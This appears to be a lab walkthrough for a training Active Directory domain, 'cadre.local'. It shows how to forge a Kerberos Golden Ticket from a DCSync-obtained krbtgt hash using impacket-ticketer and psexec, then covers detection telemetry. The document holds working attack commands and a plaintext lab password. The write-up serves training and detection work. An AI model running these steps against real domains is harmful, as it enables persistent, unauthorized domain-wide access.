# WT#010 — Golden Ticket

## Metadata

| Field | Value |
|-------|-------|
| **Target VM** | Any DC in cadre.local (post-DCSync) |
| **Domain** | cadre.local |
| **Starting Credential** | krbtgt hash + Domain SID (from DCSync — WT#009) |
| **Tools Required** | impacket-ticketer, impacket-psexec |
| **Certifications** | CRTP, CRTE |
| **MITRE ATT&CK** | T1558.001 |
| **Difficulty** | Hard |

## Prerequisites

- Complete DCSync attack (WT#009) against `cadre.local`
- krbtgt NTLM hash or AES256 key
- Domain SID of `cadre.local`
- Network access to any DC

## Attack Steps

### Step 1: Extract required data from DCSync output

```bash
# Extract krbtgt hash and domain SID from DCSync output
grep krbtgt cadre_dcsync.ntds
# Expected format: cadre.local\krbtgt:<RID>:<LM>:<NTLM>:::

# Get domain SID
impacket-lookupsid cadre.local/chief_command:'C0mm@nd_Ch1ef!'@192.168.77.10 | grep "Domain Sid"
```

### Step 2: Exploit — Forge a Golden Ticket

```bash
impacket-ticketer -nthash <KrbTgt_NTLM_Hash> -domain-sid <S-1-5-21-DOMAIN_SID> -domain cadre.local -user-id 500 Administrator
```

### Step 3: Verify — Use the forged ticket

```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass cadre.local/Administrator@dc01.cadre.local
```

## Post-Exploitation Chain

- **Forged TGT valid for 10 years** (default `MaxTicketAge`)
- **Access any resource in the domain** as any user
- **Persistence** — persists even after the original DA password is rotated
- **Mitigation** requires two krbtgt password resets

## Telemetry Verification

- **Elastic Index:** `logs-system.security-*`
- **Detection Rule:** No single event ID detects golden tickets natively — anomalous TGT issuance patterns or Kerberos service ticket anomalies are required. The `cadre-004-suspicious-proc` rule may catch impacket-ticketer execution.
- **Expected Event:** Event ID 4768 with anomalous TGT characteristics (forge time vs. domain age, unusual source IP), Event ID 4624 with anomalous logon
- **Note:** Golden tickets are notoriously hard to detect via event logs alone — look for TGT issuance at unusual hours, from unusual workstations, or with `TicketEncryptionType:0x17` (RC4) for an account configured for AES

## Status

POST-EXPLOIT
